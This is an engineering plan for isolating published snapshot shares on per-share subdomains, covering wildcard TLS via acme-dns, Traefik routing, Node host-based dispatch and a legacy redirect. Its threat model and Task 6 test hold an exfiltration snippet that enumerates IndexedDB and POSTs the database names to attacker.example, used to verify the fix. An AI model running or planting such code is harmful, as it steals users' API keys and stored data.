# Share Subdomain Isolation Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Date:** 2026-05-17
**Status:** design, not yet implemented
**Scope:** Move published shares from `rewritable.ikangai.com/s/<short>` (path-keyed, shared origin) to `<short>.rewritable.ikangai.com/` (host-keyed, isolated origin). Closes the malicious-share cross-storage attack surface introduced by snapshot publishing.

## Goal

Make each snapshot share live at its own origin so a malicious publisher cannot read any other share's IndexedDB, sessionStorage, or OPFS via cross-share script injection. The user-visible URL stays short and shareable; existing share files on disk need no change.

## Architecture

Each share's bytes are still stored as `service/data/<short>.html` + `<short>.json` on disk and still served by the same `service/server.js` container. The container now sees two host patterns:

1. **Apex** (`rewritable.ikangai.com`) — serves `/`, `/new`, `/import`, `/publish`, `/rewritable.html`, `/skill.zip`, the landing page, etc. Unchanged behavior.
2. **Share hosts** (`<short>.rewritable.ikangai.com` where `<short>` matches `[0-9a-z]{8}`) — serves the published bytes for that short code at path `/`. The Node handler extracts the short code from `req.headers.host` rather than the URL path.

Traefik routes both patterns to the same container; the Node service dispatches on host. A wildcard DNS record (`*.rewritable.ikangai.com`) plus a wildcard TLS cert (`*.rewritable.ikangai.com` as a SAN on the existing `rewritable.ikangai.com` cert) cover every short label.

Browser same-origin policy keys storage by `(scheme, host, port)`. Each share now lives on a distinct host → distinct origin → independent `sessionStorage`, IDB namespace, OPFS bucket. The malicious-share attack vanishes structurally; no per-script auditing required.

## Tech Stack

Existing infrastructure — Traefik, Let's Encrypt, Node `http`, single container per host. No new runtime deps. One configuration addition: a DNS-01 cert resolver in Traefik to issue the wildcard cert.

## Threat model (motivation)

Today every share lives at `https://rewritable.ikangai.com/s/<short>` — same origin for all shares. `service/server.js:200` (`validateContainer`) only validates DOC_UUID + bootstrap markers *exist*; the inline `<script id="rwa-bootstrap">` content is never validated. A malicious publisher can:

1. `POST /publish` a container with arbitrary JS in the bootstrap.
2. Receive back `/s/<short>`, send it to a victim.
3. The bootstrap runs in `rewritable.ikangai.com` origin context. It can read `sessionStorage` (OpenRouter API key from any earlier legit share), enumerate `indexedDB.databases()`, dump every `rwa_<UUID>` IDB at the origin, exfiltrate via `fetch()` to an attacker-controlled endpoint.

UUID-namespacing of IDB and OPFS does not save us — the malicious script is *in* the origin and can read everything. Origin isolation is the correct fix.

## URL shape

```
before: https://rewritable.ikangai.com/s/abc12345      (path-keyed, same origin)
after:  https://abc12345.rewritable.ikangai.com/       (host-keyed, isolated origin)
```

8-char short codes `[0-9a-z]` are DNS-legal labels — no escaping. The pattern is **reserved by convention**: any 8-char lowercase-alphanumeric subdomain is a share; any other label (`api.`, `docs.`, `staging.`, etc.) is free for future apex-style uses. Future subdomains must not happen to be 8-char lowercase alphanumeric, or they collide with the share router. Carve specific exceptions into Traefik with a higher-priority `Host()` rule if needed.

## Out of scope for v1

- **CSP + hashed bootstrap.** A complementary mitigation (gap 2d in the analysis doc) — would close the same attack via a different mechanism. Subdomain isolation is more architecturally clean; CSP is not needed once origins are separated.
- **Sandboxed-iframe wrapper.** The Plan B fallback if the DNS-01 cert config turns out to be infeasible on the current DNS provider. Tracked here only as a known alternative; not implemented unless Path A fails.
- **Per-share OG-card / link-preview generation.** Each share now has its own URL and could carry custom OG metadata. Defer — current shares carry none.
- **Custom share domains** (e.g. `mycompany.rewritable.ikangai.com`). The 8-char pattern reservation forecloses this anyway; a different feature for later.
- **CLI publish (`rwa publish`).** Still tracked under snapshot publishing, not this plan.

## Pre-flight

Before starting any task:

1. **DNS provider compatibility — resolved 2026-05-17.** `ikangai.com` is hosted at World4You (`ns1.world4you.at`, `ns2.world4you.at`). Two facts made the planning interesting: (a) World4You has no `lego` provider, so native DNS-01 against their API is not an option; (b) their self-serve DNS GUI doesn't expose NS records, so we couldn't delegate `acme-dns.ikangai.com` to a self-hosted acme-dns instance either. The path that shipped: delegate just the ACME-challenge subdomain to the **public `auth.acme-dns.io` service** via a single CNAME at World4You. Traefik's lego calls that service's HTTP API directly. Documented in `service/acme-dns/README.md`. Trade-off: third-party in the cert renewal chain (Risks #1).

2. **Verify HSTS state on the apex.** `curl -sI https://rewritable.ikangai.com/ | grep -i strict-transport-security`. If `includeSubDomains` is set, every `*.rewritable.ikangai.com` host will be HTTPS-only from the moment DNS resolves. Desired; just confirm.

3. **Inventory share-touching code paths.** Read `service/server.js` start to finish; specifically note:
   - `validateContainer()` at L200 (no change in this plan, but worth understanding the current validation surface)
   - The `/publish` handler around L338-370 (share URL construction)
   - The `/s/<short>` handler at L487 (the route to refactor)

4. **Verify the staging environment.** This change touches DNS + TLS + Traefik. Don't ship it directly to production; either set up a staging vhost (e.g. `staging-rewritable.ikangai.com` with its own `*.staging-rewritable.ikangai.com` wildcard) or be ready to do a fast rollback. Compose-up on the prod host is the rollback mechanism.

---

### Task 1: Wildcard cert via DNS-01 + acme-dns

**Status:** ✅ shipped 2026-05-17.

**What was deployed:**

- Registered an account with the public `auth.acme-dns.io` service (the public instance run by joohoi, author of acme-dns).
- Added one CNAME at World4You: `_acme-challenge.rewritable.ikangai.com → <fulldomain>.auth.acme-dns.io.`
- Added a second cert resolver `letsencrypt-dns` to Traefik (`/opt/docker/router/docker-compose.yml`), alongside the existing HTTP-01 `letsencrypt` resolver. Uses the lego `acme-dns` provider pointing at `https://auth.acme-dns.io`.
- Dropped the lego accounts JSON at `/opt/docker/router/letsencrypt/acme-dns-accounts.json` (mode 600).
- Forced first issuance via a throwaway router; verified the resulting cert has SANs `*.rewritable.ikangai.com` and `rewritable.ikangai.com`, issued by Let's Encrypt R13.
- Removed the throwaway router. Cert persists in `/opt/docker/router/letsencrypt/acme-dns.json`; auto-renews every ~60 days.

**Runbook for re-running / recovering:** `service/acme-dns/README.md`. Includes the Traefik diff, the CNAME at World4You, credential location, and the steps to re-register if the credentials are ever lost.

**What we did NOT ship:** the originally-planned self-hosted acme-dns container on the VPS. World4You's DNS GUI doesn't expose NS records, so we couldn't delegate `acme-dns.ikangai.com` to a local instance. Self-hosted artifacts (`config.cfg`, `docker-compose.yml`) existed briefly in `service/acme-dns/` before being removed; the container was started and torn down without any account ever being registered against it.

**Diagnostics added during deploy:** `--log.level=INFO` flag on Traefik. Kept (low noise, useful for future issues).

**Rollback:** Remove the `letsencrypt-dns.*` flags + `environment:` block from `/opt/docker/router/docker-compose.yml`; restart Traefik. HTTP-01 path is untouched. The acme-dns account at `auth.acme-dns.io` and the CNAME at World4You can stay dormant (no operational cost).

---

### Task 2: Wildcard DNS record

**Files:**
- Modify: DNS zone for `ikangai.com` at your DNS provider's control panel or via API.

**Behavior:**

Add:
```
*.rewritable.ikangai.com.   A    185.164.4.77
*.rewritable.ikangai.com.   AAAA <ipv6 if applicable>
```

Existing `rewritable.ikangai.com.` A/AAAA records stay in place. TTL: match the existing `rewritable.ikangai.com` record (typically 300-3600 seconds).

**Verification:**

After TTL propagation:
```
dig +short test123ab.rewritable.ikangai.com
```
Should return the same IP as `rewritable.ikangai.com`.

**Rollback:** Delete the wildcard record. TTL applies before old resolvers forget; pick a short TTL initially.

---

### Task 3: Server.js — host-keyed routing

**Files:**
- Modify: `service/server.js`

**Behavior:**

Refactor the existing `/s/<short>` handler (L487-) into a `serveShare(short, req, res)` helper. Add a host-extraction at the top of the request handler:

```js
const SHORT_HOST_RE = /^([0-9a-z]{8})\.rewritable\./;

// ... inside the request handler, after method/URL parsing:
const hostShort = (req.headers.host || '').match(SHORT_HOST_RE);
if (hostShort && (req.method === 'GET' || req.method === 'HEAD')) {
  // Subdomain share access: <short>.rewritable.ikangai.com/
  // Path is always '/' for share GETs; reject other paths to 404
  // (anything else implies path probing).
  if (url !== '/' && url !== '') return send(404, { 'Content-Type': 'text/plain' }, 'not found\n');
  return serveShare(hostShort[1], req, res);
}
```

Update `/publish` share URL construction (currently L369-370):

```js
const apexHost = req.headers.host || 'localhost';
// Localhost dev: stay on path-keyed URLs (wildcard DNS doesn't work for localhost).
const isLocalDev = /^localhost(:\d+)?$/.test(apexHost) || /^127\./.test(apexHost);
const shareUrl = isLocalDev
  ? `${scheme}://${apexHost}/s/${short}`
  : `${scheme}://${short}.${apexHost}/`;
```

Add a `/robots.txt` handler that serves `User-agent: *\nDisallow: /` when the request comes in on a share host (keep crawlers out of ephemeral content):

```js
if (hostShort && url === '/robots.txt') {
  return send(200, { 'Content-Type': 'text/plain' }, 'User-agent: *\nDisallow: /\n');
}
```

**Verification:**

Run the local dev server (`node service/server.js`). With wildcard DNS unavailable locally:
1. `curl http://localhost:8080/s/<existing-short>` — still works (localhost fallback).
2. Add a `/etc/hosts` entry `127.0.0.1 abc12345.rewritable.local` and route `RWA_PORT=8080 node service/server.js`, then `curl -H "Host: abc12345.rewritable.local" http://localhost:8080/` — confirm it serves the share bytes for the local stub data file.
3. `curl -H "Host: api.rewritable.local" http://localhost:8080/` — confirm it routes to the apex (not the share handler), since `api` is not 8 lowercase-alphanumeric chars.

**Rollback:** Revert the routing change; share URLs revert to path-keyed.

---

### Task 4: Traefik labels for wildcard router

**Files:**
- Modify: `service/docker-compose.prod.yml`

**Behavior:**

Add a second router alongside the existing `rewritable` router. Both point at the same `rewritable` service; the regex constrains the share router to 8-char lowercase-alphanumeric subdomains exactly.

```yaml
labels:
  - "traefik.enable=true"

  # Apex router — unchanged, keeps HTTP-01 cert resolver.
  - "traefik.http.routers.rewritable-apex.rule=Host(`rewritable.ikangai.com`)"
  - "traefik.http.routers.rewritable-apex.entrypoints=websecure"
  - "traefik.http.routers.rewritable-apex.tls.certresolver=letsencrypt"
  - "traefik.http.routers.rewritable-apex.service=rewritable-svc"

  # Share router — 8-char alphanumeric subdomains only, DNS-01 wildcard cert.
  - "traefik.http.routers.rewritable-shares.rule=HostRegexp(`{short:[0-9a-z]{8}}.rewritable.ikangai.com`)"
  - "traefik.http.routers.rewritable-shares.entrypoints=websecure"
  - "traefik.http.routers.rewritable-shares.tls.certresolver=letsencrypt-dns"
  - "traefik.http.routers.rewritable-shares.tls.domains[0].main=rewritable.ikangai.com"
  - "traefik.http.routers.rewritable-shares.tls.domains[0].sans=*.rewritable.ikangai.com"
  - "traefik.http.routers.rewritable-shares.service=rewritable-svc"

  - "traefik.http.services.rewritable-svc.loadbalancer.server.port=80"
```

Note the explicit `service=rewritable-svc` on both routers and the renamed service. Required because the old single-router setup let Traefik auto-name the service; with two routers we need to name it.

**Verification:**

Deploy to the host (`scp` modified compose file, `docker compose up -d --force-recreate`). Then:

1. `curl -vI https://rewritable.ikangai.com/` — apex route still 200s on landing page.
2. `curl -vI https://abc12345.rewritable.ikangai.com/` — assuming an existing share `abc12345`, returns 200 with the share bytes.
3. `curl -vI https://api.rewritable.ikangai.com/` — should return 404 from the Node service (apex router matched, no `api.` route in Node) rather than from Traefik. Confirms the regex correctly didn't capture `api`.

**Rollback:** Revert compose file, re-deploy. Apex behavior unchanged.

---

### Task 5: 301 redirect for legacy `/s/<short>` URLs

**Files:**
- Modify: `service/server.js` (the existing `/s/<short>` handler)

**Behavior:**

Keep the path-keyed handler alive as a 301 redirect to the new host-keyed URL. Existing 24h windows of pre-migration shares stay reachable.

```js
if (url.startsWith('/s/')) {
  const m = url.match(/^\/s\/([0-9a-z]{8})$/);
  if (m && !isLocalDev) {
    return send(301, {
      'Location': `https://${m[1]}.${apexHost}/`,
      'Cache-Control': 'public, max-age=86400'
    }, '');
  }
  // Local dev: fall through to the existing path-keyed handler
  if (m && isLocalDev) return serveShare(m[1], req, res);
  return send(404, { 'Content-Type': 'text/plain' }, 'not found\n');
}
```

Note: the redirect targets `https://...` unconditionally — published shares have always been HTTPS. The cache header lets browsers and intermediate caches store the redirect for the 24h share-expiry window.

**Verification:**

`curl -vI https://rewritable.ikangai.com/s/<existing-short>` returns `301 Location: https://<short>.rewritable.ikangai.com/`. Follow with `-L` to confirm the full chain serves the share bytes.

**Cleanup follow-up:** 24h after deployment, every pre-migration `/s/<short>` URL has expired anyway. The redirect can be removed in a later commit if desired, or kept indefinitely as a courtesy for stale links.

---

### Task 6: Staging verification

**Files:** none (validation only)

**Behavior:**

1. **Publish two test shares** via the live `/publish` endpoint. Receive back two host-keyed URLs.
2. **Open share A in tab 1.** Use ⌘K to make a small edit. DevTools → Application → IndexedDB: confirm `rwa_<DOC_UUID>` exists under origin `https://shareA.rewritable.ikangai.com`.
3. **Open share B in tab 2.** DevTools → Application: confirm `rwa_<DOC_UUID>` for share B exists under origin `https://shareB.rewritable.ikangai.com` only. The tab cannot see share A's IDB.
4. **Confirm sessionStorage isolation.** Set a key in share A's tab via console (`sessionStorage.test = 'A'`). In share B's tab, `sessionStorage.test` is undefined.
5. **Confirm OPFS isolation** (if either share uses `runtime.fs.*`). Each share's OPFS is rooted in its own origin's bucket.
6. **Test the malicious-share scenario.** Hand-craft a container with a tampered bootstrap that does `for (const db of await indexedDB.databases()) { fetch('https://attacker.example/exfil', { method: 'POST', body: db.name }); }`. Publish it, open the resulting URL: the only DB it can enumerate is its own; no other shares' DBs are visible. This is the actual security property being validated.

**Verification result documented in:** CHANGELOG entry (Task 7).

---

### Task 7: Documentation

**Files:**
- Modify: `CHANGELOG.md` — new dated entry under today's date
- Modify: `CLAUDE.md` — update the snapshot-publishing paragraph at L162 (drop the "Known v1 gap" sentence about non-namespaced OPFS leaking; replace with the new origin-isolation property)
- Modify: `README.md` — update any mention of `/s/<short>` URL shape

**CHANGELOG entry outline:**

```
## 2026-05-17 — Share subdomain isolation

Published shares now live at `https://<short>.rewritable.ikangai.com/` instead of
`https://rewritable.ikangai.com/s/<short>`. Each share gets its own origin, so a
malicious publisher's script can no longer read other shares' IndexedDB,
sessionStorage, or OPFS — those storage tiers are now origin-keyed by the
browser's same-origin policy. ...
```

**CLAUDE.md update at L162** — rewrite the "Known v1 gap" sentence to reflect closure.

**Verification:** docs render correctly in Markdown preview; references match implementation.

---

## Rejected alternatives

- **`<short>.s.rewritable.ikangai.com`** (the `s.` namespace boundary). Four DNS labels is unwieldy; the `s.` label was never load-bearing — it was just a named reserved zone. The 8-char-alphanumeric pattern reservation gives the same forward-compatibility without the extra label.
- **Self-hosted `joohoi/acme-dns` on the VPS.** Originally the chosen Task 1 path. Would have given us full control of the trust chain (no third-party dependency) and is a well-documented pattern. Rejected on 2026-05-17 because World4You's self-serve DNS GUI doesn't expose NS records, so we couldn't delegate `acme-dns.ikangai.com` to the self-hosted instance. The container was briefly deployed and torn down before any account was registered against it. Reachable again via a World4You support ticket if we ever want to move away from the public service.
- **Per-share HTTP-01 (no wildcard).** Each share's hostname (`<short>.rewritable.ikangai.com`) could get its own non-wildcard cert issued on demand via HTTP-01 — DNS-01 + acme-dns goes away entirely. Rejected because of LE's 50-certs-per-registered-domain-per-week rate limit (~7 publishes/day ceiling) and 5–30s issuance latency per share. Workable for personal/low-volume use; not workable for any growth pattern.
- **CSP with hashed bootstrap script.** Would also close the attack, but requires server-side hashing of every published bootstrap and a per-share CSP header — more moving parts than origin isolation. Better as a *defense in depth* on top of subdomain isolation if ever desired.
- **Server-side bootstrap whitelist.** On `/publish`, replace the publisher's bootstrap bytes with the canonical bootstrap (only keep `INLINE_DOC` content). Cheaper but brittle — bootstrap evolves, and we'd need a versioning story to keep older shares serving correctly. Origin isolation is structural, not policy-based.
- **Sandboxed-iframe wrapper without subdomain change.** Wrapping share content in `<iframe sandbox="allow-scripts" srcdoc="...">` gives null-origin isolation, but without `allow-same-origin` the share's IDB/OPFS are inaccessible — the runtime breaks entirely. With `allow-same-origin` *and* a parent at the apex host, the iframe inherits the parent origin → no isolation. Only works if the iframe is loaded from a different host, at which point you've already done the subdomain work.
- **Native DNS-01 against World4You's API.** World4You has no `lego` provider and no documented DNS API. Writing a custom `httpreq` shim against their web UI was rejected as fragile against an undocumented endpoint.
- **Migrating DNS hosting** (delegating `rewritable.ikangai.com` to Cloudflare / deSEC / Hetzner DNS / etc.). Cleaner long-term but splits zone management across two providers; acme-dns gives the same benefit (DNS-01 wildcard support) with only one delegated subdomain and no provider account changes.
- **New short domain (e.g. `rwa.link`).** Maximum aesthetics, maximum cost (another DNS zone, cert resolver, Traefik config to maintain). Worth it only if shareable URLs become a hot adoption path; they're not yet.

## Risks / non-obvious points

1. **`auth.acme-dns.io` is a third-party dependency in the cert renewal chain.** If the public service goes down or is compromised, wildcard cert renewals fail or someone else can mint certs for `*.rewritable.ikangai.com`. Mitigations: renewals are every ~60 days with a 30-day overlap window, so brief outages are tolerable and we'd see the failure in Traefik logs before the cert actually expires. If the service has a sustained outage, we can re-register with a different provider (self-hosted acme-dns on the VPS if we ever get NS records at World4You; or migrate DNS to Cloudflare/deSEC) and rotate the CNAME in one step.
2. **Credentials JSON is the secret in this chain.** `/opt/docker/router/letsencrypt/acme-dns-accounts.json` (mode 600) holds the username/password that can write TXT records under our delegated subdomain. Blast radius is small (one subdomain) but treat the file like an API token. Back up `/root/acme-dns-rewritable-registration.json` (the original registration response) somewhere off-host.
3. **8-char alphanumeric subdomains are reserved by convention.** Any future subdomain that happens to be 8 lowercase alphanumeric characters will be intercepted by the share router. Document this; carve specific exceptions with higher-priority `Host()` rules if needed.
4. **Cert renewal cadence.** Wildcard certs renew via DNS-01 every ~60 days. `auth.acme-dns.io` and Let's Encrypt must both stay reachable from Traefik at renewal time. Monitor Traefik's cert-expiry logs.
5. **Subdomain takeover risk.** Standard pitfall: if the wildcard DNS record ever points at an IP we stop owning, anyone who later owns that IP can serve content under any `<short>.rewritable.ikangai.com`. Single-host setup makes this unlikely to bite, but worth knowing.
6. **Local dev story** uses path-keyed URLs as a fallback (wildcard DNS doesn't resolve against `localhost`). Devs testing share isolation must use `/etc/hosts` entries or accept that production has properties dev cannot fully reproduce.
7. **`/import` cross-origin assumption.** `/import` fetches `/rewritable.html` from the same origin to construct a fresh container. Lives on the apex; never touches subdomain shares. Confirmed — no breakage.
8. **Pre-migration shares survive their 24h window.** Existing `<short>.html` files on disk are origin-agnostic; the 301 redirect (Task 5) keeps old URLs working until their natural expiry. No data migration needed.

## Cost summary

| Task | Estimate | Status |
|---|---|---|
| 1 — DNS-01 resolver via `auth.acme-dns.io` | ~1 hour actual | ✅ shipped 2026-05-17 |
| 2 — Wildcard DNS record at World4You | already in place | ✅ done |
| 3 — server.js host-keyed routing | ~1 hour actual | ✅ shipped 2026-05-17 (`4b03a65`) |
| 4 — Traefik labels for share router | ~30 min actual | ✅ shipped 2026-05-17 (`6bea576`) |
| 5 — Legacy 301 | included in task 3 | ✅ shipped 2026-05-17 (`4b03a65`) |
| 6 — Staging verification | 30 min actual | ✅ verified 2026-05-17 (publish + DevTools cross-share check confirmed isolation) |
| 7 — Docs (CHANGELOG, CLAUDE.md, README) | ~30 min actual | ✅ done 2026-05-17 |

---

*Status: **fully shipped 2026-05-17**. Published shares now live at `https://<short>.rewritable.ikangai.com/`. Each share has its own origin → browser same-origin policy isolates per-share IDB, sessionStorage, OPFS. The malicious-share cross-storage attack from the original gap analysis is structurally closed. Legacy `/s/<short>` URLs 301-redirect through the 24h share-expiry window. Wildcard cert auto-renews via `letsencrypt-dns` + `auth.acme-dns.io` every ~60 days.*
